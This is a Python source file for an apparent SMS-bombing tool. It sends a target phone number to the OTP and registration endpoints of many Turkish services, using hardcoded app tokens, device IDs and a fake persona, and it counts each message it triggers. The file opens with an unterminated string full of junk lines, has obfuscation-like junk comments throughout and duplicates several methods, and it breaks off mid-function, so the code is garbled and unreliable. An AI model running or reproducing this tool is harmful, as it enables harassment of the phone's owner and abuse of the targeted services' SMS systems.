import base64
siktirgit="
#JALKSJFKLAUJSFJWHBAKJSHEAWJKFBAWLRJUQWKLE1J2LKJSLKDJ2KL5JASKFJSMCNAMSHW1324JKLHASFWHAJSKHAJKWSHAWJKFA#
#JALKSJFKGHDFJLAUJSFJWHBAKJSHEAWJKFBAWLRJUQWKLE1J2LKJSLKDJ2KJFGHJL5JASKFJSMCNAMSHW1324JKLHASFWHAJSKHAJKWSHAWJKFA#HJ
#JALKSJFKLAUJSFJWHBAKJSHEAWJKFBAWLRJUQWKLE1J2LKJSLKDJ2KL5JASKFJSMCNAMSHW1324JKLHASFWHAJSKHAJKWSHAWJKFA#
#JALKSJFKLAUJSFJWHBASFGSDGKJSHEAWJKFBAWLRFGHJUQWKLE1J2LKJSLKDJ2KL5JASKFJSMCNAMSHW1324JKLHASFWHAJSKHAJKWSHAWJKFA#
#JALKHJGHJGSJFKLAUJSJFGKFGFJWHBAKJSHEAWHJFGJKFBAWLFGJFGRJUQWKLE1J2LKJSLKDJFGHJ2KL5JASKFJSMCNAMSFGJFHHW1324JKLHASFWHAJSKHAJKWSHAWJKFA#
#JALKSJFKLSFDHDFAUJSFJWHBAKJSHEAWJKFBAWLRJUQWKLE1J2LKJSLKDJ2KL5JASKFJSMCNAMSHW1324JKLHASFWHAJSKHAJKWSHAWJKFA#
#JGSDFGDFALKSJFKLAUJSFJWHBASFWAAKJSHEAWJKFBAWLRJUQWKLE1J2LKJSLKDJ2KL5JASKFJSMCNAMSHW1324JKLHASFWHAJSKHAJKWSHAWJKFA#
#JALKSJFKLAUJFGJSFJWHBAKJSHEAWJKFBAWLRJUQWKLE1J2LKJSLKDHFGJJ2KL5JASKFJSMCNAMSHW1324JKLHASFWHAJSKHAJKWSHAWJKFA#
#JALKSHDFGJFKLAUJSFJWHJHFGBAKJSHEAWJKFBAWLRJUQWKLE1J2LKJSLKDJ2KL5JASKFJSMCNAMSHW1324JKLHASFWHAJSKHAJKWSHAWJKFA#
#JALKSJFKLAUJSFJWHBAKJSHEAWJKFBAWLRJUQWKLE1J2LKJSLKDJFGHFJ2KL5JASKFJSMCNAMSHW1324JKLHASFWHAJSKHAJKWSHAWJKFA#
#JALKSFGJFJFKLAUJSFJWHBAKJSHEAWJKFBAWLRJUQWKLE1J2LKJSLKDJ2KL5JASKFJSMCNAMSHW1324JKLHASFWHAJSKHAJKWSHAWJKFA#
#JALKSJFKLAUJSFJWHBAKJSHEAWJKFBAWLRJUQWKLE1J2LKJSLKDJ2KL5JASKFJSMCNAMSHW1324JKLHASFWHAJSKHAJKWSHAWJKFA#
#JALKSJFKLAUJSFJWHBAKJSHEAWJKFBAWLRJUQWKLE1J2LKJSLKDJ2KL5JASKFJSMCNAMSHW1324JKLHASFWHAJSKHAJKWSHAWJKFA#
#JALKSJFKLAUFGHFGHJSFJWHBAKJSHEAWJKFBAWLRJUQWKLE1J2LKJSLKDJ2KL5JASKFJSMCNAMSHW1324JKLHASFWHAJSKHAJKWSHAWJKFA#
#JALKSJFKLAUJSFJWHBAKJFJFGJFSHEAWJKFBAWLRJUQWKLE1J2LKJSLKDJ2KL5JASKFJSMCNAMSHW1324JKLHASFWHAJSKHAJKWSHAWJKFA#
#JALKSJFKLAUJSFJWHBAKJSHEAWJKFBAWLRJUQWKLE1J2LKJSLKDJ2KL5JAGHFGHSKFJSMCNAMSHW1324JKLHASFWHAJSKHAJKWSHAWJKFA##JALKSJFKL#AUJSFJWHBAKJSHEAWJKFBAWLRJUQWKLE1J2LKJSLKDJ2KL5JASKFJSMCNAMSHW1324JKLHASFWHAJSKHAJKWSHAWJKFA#
#JALKSJFKLAUJSFJWHBAKJSHEAWJKFBAWLRJUQWKLE1J2LKJSLKDJ2KL5JASKFJSMCNAMSHW1324JKLHASFWHAJSKHAJKWSHAWJKFA#
#JALKSJFKLAUJSFJWHBAKJSHEAWJKFBAWLRJUQWKLE1J2LKJSLKDJ2KL5JASKFJSMCNAMSHW1324JKLHASFWHAJSKHAJKWSHAWJKFA#
#JALKSJFKLAUJSFJWHBAKJSHEAWJKFBAWLRJUQWKLE1J2LKJSLKDJ2KL5JASKFJSMCNAMSHW1324JKLHASFWHAJSKHAJKWSHAWJKFA#
#JALKSJFKLAUJSFJWHBAKJSHEAWJKFBAWLRJUQWKLE1J2LKJSLKDJ2KL5JASKFJSMCNAMSHW1324JKLHASFWHAJSKHAJKWSHAWJKFA#
#JALKSJFKLAUJSFJWHBAKJSHEAWJKFBAWLRJUQWKLE1J2LKJSLKDJ2KL5JASKFJSMCNAMSHW1324JKLHASFWHAJSKHAJKWSHAWJKFA#
#JALKSJFKLAUJSFJWHBAKJSHEAWJKFBAWLRJUQWKLE1J2LKJSLKDJ2KL5JASKFJSMCNAMSHW1324JKLHASFWHAJSKHAJKWSHAWJKFA#


import requests
from random import choice
from string import ascii_lowercase
from colorama import Fore, Style


class SendSms():
    adet = 0

    def __init__(self, phone, mail):
        self.phone = str(phone)
        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(19)) + "@gmail.com"

        # kahvedunyasi.com

    def KahveDunyasi(self):
        try:
            kahve_dunyasi = requests.post("https://core.kahvedunyasi.com/api/users/sms/send", data={
                "mobile_number": self.phone,
                "token_type": "register_token"
            })
            if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
                print(
                    f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> core.kahvedunyasi.com")
                self.adet += 1
            else:
                raise
        except:
            print(
                f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> core.kahvedunyasi.com")

        # wmf.com.tr

    def Wmf(self):
        try:
            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
                "confirm": "true",
                "date_of_birth": "1956-03-01",
                "email": self.mail,
                "email_allowed": "true",
                "first_name": "Memati",
                "gender": "male",
                "last_name": "Bas",
                "password": "31ABC..abc31",
                "phone": f"0{self.phone}"
            })
            if wmf.status_code == 202:
                print(
                    f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(
                f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")

        # tiklagelsin.com

    def TiklaGelsin(self):
        try:
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            headers = {"Content-Type": "application/json", "X-Merchant-Type": "0", "Accept": "*/*",
                       "Appversion": "2.4.1", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate",
                       "X-No-Auth": "true", "User-Agent": "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                       "X-Device-Type": "2"}
            json = {"operationName": "GENERATE_OTP",
                    "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n",
                    "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68",
                                  "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB",
                                  "phone": f"+90{self.phone}"}}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["data"]["generateOtp"] == True:
                print(
                    f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print(
                f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com")

        # ayyildiz.com.tr

    def Ayyildiz(self):
        try:
            url = f"https://api.altinyildizclassics.com:443/mobileapi2/autapi/CreateSmsOtpForRegister?gsm={self.phone}"
            headers = {"Accept": "*/*",
                       "Token": "MXZ5NTJ82WXBUJB7KBP10AGR3AF6S4GB95VZDU4G44JFEIN3WISAC2KLRIBNONQ7QVCZXM3ZHI661AMVXLKJLF9HUKI5SQ2ROMZS",
                       "Devicetype": "mobileapp", "Accept-Encoding": "gzip, deflate",
                       "User-Agent": "altinyildiz/2.7 (com.brmagazacilik.altinyildiz; build:2; iOS 15.7.7) Alamofire/2.7",
                       "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9"}
            r = requests.post(url, headers=headers)
            if r.json()["Success"] == True:
                print(
                    f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.altinyildizclassics.com")
                self.adet += 1
            else:
                raise
        except:
            print(
                f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.altinyildizclassics.com")

        # naosstars.com

    def Naosstars(self):
        try:
            url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
            headers = {"Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351",
                       "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                       "Access-Control-Allow-Origin": "*", "Locale": "en-TR", "Version": "1.0030", "Os": "ios",
                       "Apiurl": "https://api.naosstars.com/api/", "Device-Id": "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC",
                       "Platform": "ios", "Accept-Language": "en-US,en;q=0.9", "Timezone": "Europe/Istanbul",
                       "Globaluuidv4": "d57bd5d2-cf1e-420c-b43d-61117cf9b517", "Timezoneoffset": "-180",
                       "Accept": "application/json", "Content-Type": "application/json; charset=utf-8",
                       "Accept-Encoding": "gzip, deflate", "Apitype": "mobile_app"}
            json = {"telephone": f"+90{self.phone}", "type": "register"}
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 200:
                print(
                    f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.naosstars.com")
                self.adet += 1
            else:
                raise
        except:
            print(
                f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.naosstars.com")

        # bim

    def Bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login", json={"phone": self.phone})
            if bim.status_code == 200:
                print(
                    f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> bim.veesk.net")
                self.adet += 1
            else:
                raise
        except:
            print(
                f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> bim.veesk.net")

        # englishhome.com

    def Englishhome(self):
        try:
            data = {"first_name": "Memati", "last_name": "Bas", "email": self.mail, "phone": f"0{self.phone}",
                    "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true",
                    "tom_pay_allowed": "true"}
            home = requests.post("https://www.englishhome.com:443/enh_app/users/registration/", data=data)
            if home.status_code == 202:
                print(
                    f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> englishhome.com")
                self.adet += 1
            else:
                raise
        except:
            print(
                f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> englishhome.com")

        # icq.net

    def Icq(self):
        try:
            url = f"https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90{self.phone}&platform=ios&r=796356153&smsFormatType=human"
            headers = {"Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded",
                       "User-Agent": "ICQ iOS #no_user_id# gu19PNBblQjCdbMU 23.1.1(124106) 15.7.7 iPhone9,4",
                       "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
            r = requests.post(url, headers=headers)
            if r.json()["response"]["statusCode"] == 200:
                print(
                    f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> u.icq.net")
                self.adet += 1
            else:
                raise
        except:
            print(
                f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> u.icq.net")

        # evidea.com

    def Evidea(self):
        try:
            url = "https://www.evidea.com:443/users/register/"
            headers = {
                "Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi",
                "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*",
                "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest",
                "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate",
                "X-App-Device": "ios", "Referer": "https://www.evidea.com/",
                "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0",
                "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}
            data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
            r = requests.post(url, headers=headers, data=data)
            if r.status_code == 202:
                print(
                    f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> evidea.com")
                self.adet += 1
            else:
                raise
        except:
            print(
                f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> evidea.com")

            # marti.tech

    def Marti(self):
        try:
            url = "https://customer.martiscooter.com:443/v13/scooter/dispatch/customer/signin"
            json = {"mobilePhone": self.phone, "mobilePhoneCountryCode": "90", "oneSignalId": ""}
            r = requests.post(url, json=json)
            if r.json()["isSuccess"] == True:
                print(
                    f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> customer.martiscooter.com")
                self.adet += 1
            else:
                raise
        except:
            print(
                f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> customer.martiscooter.com")

        # heyscooter.com.tr

    def Hey(self):
        try:
            url = f"https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}&requestid=18bca4e4-2f45-41b0-b054-3efd5b2c9c57-20230730&territoryId=738211d4-fd9d-4168-81a6-b7dbf91170e9"
            headers = {"Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate",
                       "User-Agent": "HEY!%20Scooter/143 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "tr"}
            r = requests.post(url, headers=headers)
            if r.json()["IsSuccess"] == True:
                print(
                    f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> heyapi.heymobility.tech")
                self.adet += 1
            else:
                raise
        except:
            print(
                f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> heyapi.heymobility.tech")

        # bineq.tech

    def Bineq(self):
        try:
            url = f"https://bineqapi.heymobility.tech:443/V3//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}"
            header = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json",
                      "Accept-Encoding": "gzip, deflate",
                      "User-Agent": "HEY!%20Scooter/128 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "tr"}
            r = requests.post(url, headers=header)
            if r.json()["IsSuccess"] == True:
                print(
                    f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> bineqapi.heymobility.tech")
                self.adet += 1
            else:
                raise
        except:
            print(
                f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> bineqapi.heymobility.tech")

        # tiklagelsin.com

    def TiklaGelsin(self):
        try:
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            headers = {"Content-Type": "application/json", "X-Merchant-Type": "0", "Accept": "*/*",
                       "Appversion": "2.4.1", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate",
                       "X-No-Auth": "true", "User-Agent": "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                       "X-Device-Type": "2"}
            json = {"operationName": "GENERATE_OTP",
                    "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n",
                    "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68",
                                  "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB",
                                  "phone": f"+90{self.phone}"}}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["data"]["generateOtp"] == True:
                print(
                    f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print(
                f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com")

        # tasimacim.com

    def Tasimacim(self):
        try:
            url = "https://server.tasimacim.com/requestcode"
            json = {"phone": self.phone, "lang": "tr"}
            r = requests.post(url=url, json=json)
            if r.status_code == 200:
                print(
                    f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> server.tasimacim.com")
                self.adet += 1
            else:
                raise
        except:
            print(
                f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> server.tasimacim.com")

        # yuffi.co

    def Yuffi(self):
        try:
            url = "https://api.yuffi.co/api/parent/login/user"
            json = {"phone": self.phone, "kvkk": True}
            r = requests.post(url, json=json)
            if r.json()["success"] == True:
                print(
                    f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.yuffi.co")
                self.adet += 1
            else:
                raise
        except:
            print(
                f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.yuffi.co")
    def a101(self):
        try:
            wmf = requests.post("https://www.a101.com.tr/login/&register=true", data={
                "phone": self.phone
            })
            if wmf.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> www.a101.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> www.a101.com.tr")

    def kahve(self):
        try:
            wmf = requests.post("www.kahvedunyasi.com/kayit-ol", data={
                "mobile_number": self.phone,
            })
            if wmf.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> www.kahvedunyasi.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> www.kahvedunyasi.com")

    # wmf.com.tr

    def Wmf(self):
        try:
            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
                "confirm": "true",
                "date_of_birth": "1956-03-01",
                "email": self.mail,
                "email_allowed": "true",
                "first_name": "Memati",
                "gender": "male",
                "last_name": "Bas",
                "password": "31ABC..abc31",
                "phone": f"0{self.phone}"
            })
            if wmf.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}  [+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}  [-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")

    # tiklagelsin.com
    def TiklaGelsin(
            self):  ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£
        try:  ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            headers = {"Content-Type": "application/json", "X-Merchant-Type": "0", "Accept": "*/*",
                       "Appversion": "2.4.1", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate",
                       "X-No-Auth": "true", "User-Agent": "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                       "X-Device-Type": "2"}
            json = {"operationName": "GENERATE_OTP",
                    "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n",
                    "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68",
                                  "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB",
                                  "phone": f"+90{self.phone}"}}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["data"]["generateOtp"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com")

    def Hey(self):
        try:
            url = f"https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}&requestid=18bca4e4-2f45-41b0-b054-3efd5b2c9c57-20230730&territoryId=738211d4-fd9d-4168-81a6-b7dbf91170e9"
            headers = {"Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate",
                       "User-Agent": "HEY!%20Scooter/143 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "tr"}
            ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£
            ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£
            ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£
            ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£
            ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£
            ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£
            ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£
            ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£

            r = requests.post(url, headers=headers)
            if r.json()["IsSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> heyapi.heymobility.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> heyapi.heymobility.tech")

    ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£
    ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£

    # bineq.tech
    def Bineq(self):
        try:
            url = f"https://bineqapi.heymobility.tech:443/V3//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}"
            header = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json",
                      "Accept-Encoding": "gzip, deflate",
                      "User-Agent": "HEY!%20Scooter/128 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "tr"}
            r = requests.post(url, headers=header)
            if r.json()["IsSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bineqapi.heymobility.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bineqapi.heymobility.tech")

    # bisu.com.tr
    def Bisu(self):
        try:
            url = "https://www.bisu.com.tr:443/api/v2/app/authentication/phone/register"
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "X-Device-Platform": "IOS",
                       "X-Build-Version-Name": "9.4.0", "Authorization": "0561b4dd-e668-48ac-b65e-5afa99bf098e",
                       "X-Build-Version-Code": "22", "Accept": "*/*", "X-Device-Manufacturer": "Apple",
                       "X-Device-Locale": "en", "X-Client-Device-Id": "66585653-CB6A-48CA-A42D-3F266677E3B5",
                       "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate",
                       "X-Device-Platform-Version": "15.7.7",
                       "User-Agent": "BiSU/22 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Model": "iPhone 7 Plus",
                       "X-Build-Type": "Release"}
            data = {"phoneNumber": self.phone}
            r = requests.post(url, headers=headers, data=data)
            if r.json()["errors"] == None:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bisu.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bisu.com.tr")

    # 345dijital.com
    def Ucdortbes(self):
        try:
            url = "https://api.345dijital.com:443/api/users/register"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json",
                       "Accept-Encoding": "gzip, deflate",
                       "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                       "Accept-Language": "en-US,en;q=0.9", "Authorization": "null", "Connection": "close"}
            json = {"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["error"] == "E-Posta veya telefon zaten kayıtlı!":
                ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£
                ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£
                ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£
                ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£
                ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£
                ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£
                ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£
                ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£
                ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£
                ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£
                ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£
                ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£
                ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£
                ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£
                ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£
                ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.345dijital.com")
            else:
                raise
        except:
